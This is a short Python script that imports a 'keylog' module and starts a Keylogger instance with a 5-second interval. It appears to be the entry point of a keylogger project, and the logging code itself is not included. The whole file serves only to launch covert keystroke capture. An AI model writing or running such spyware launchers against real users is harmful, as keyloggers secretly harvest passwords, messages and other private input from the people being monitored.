#!/usr/bin/env python3
#use keylog.py file class
#import and create instance of class

import keylog

my_keylogger = keylog.Keylogger(5) #pass value of 5 seconds
my_keylogger.start()
